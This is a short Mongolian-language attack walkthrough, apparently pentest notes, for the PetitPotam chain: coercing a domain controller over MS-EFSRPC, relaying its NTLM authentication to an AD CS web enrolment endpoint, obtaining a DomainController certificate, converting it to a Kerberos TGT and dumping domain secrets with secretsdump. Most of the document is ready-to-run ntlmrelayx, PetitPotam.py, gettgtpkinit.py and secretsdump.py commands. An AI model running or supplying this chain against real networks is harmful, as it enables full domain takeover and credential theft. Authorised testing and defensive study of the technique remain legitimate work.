# PetitPotam - NTLM Relay to AD CS

## Логик тайлбар

Энэ халдлага нь **3 өөр сул талыг** нэг хэлхээ (Chain) болгож ашигладаг:

1. **Authentication Coercion (Албадан холболт):** Windows-ийн `MS-EFSRPC` протоколын алдааг ашиглан Domain Controller-ийг өөрийнхөө (Attacker) компьютер руу холбогдуулна
2. **NTLM Relay (Дамжуулалт):** DC-ийн NTLM handshake-ийг замаас нь барьж аваад **AD CS (Сертификатын сервер)** рүү дамжуулна
3. **AD CS Abuse (Сертификат хулгайлах):** AD CS сервер DC-ийн нэр дээр дижитал сертификат олгоно

## 1. AD CS рүү дамжуулах "урхиа" бэлдэх

```bash
sudo impacket-ntlmrelayx -debug -smb2support --target http://<CA_IP>/certsrv/certfnsh.asp --adcs --template DomainController
```

- `-target`: Сертификат олгодог (CA) серверийн вэб хаяг
- `-adcs`: Сертификатын сервер рүү дайрч байгааг заана
- `-template DomainController`: DC-ийн эрхтэй сертификат авахыг хүснэ

## 2. DC-г албадаж өөрийнхөө машин руу холбогдуулах

```bash
python3 PetitPotam.py <Attack_IP> <DC_IP>
```

DC `Attack_IP` руу NTLM-ээр холбогдох бөгөөд `ntlmrelayx` түүнийг CA руу дамжуулна. CA-аас **Base64** сертификат ирнэ.

## 3. Base64 сертификатаар Kerberos TGT авах

```bash
python3 gettgtpkinit.py DOMAIN/DC_NAME\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```

`dc01.ccache` файл нь DC-ийн өмнөөс юу ч хийх боломж олгоно:

```bash
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass "DC_NAME$"@DC_HOSTNAME
```
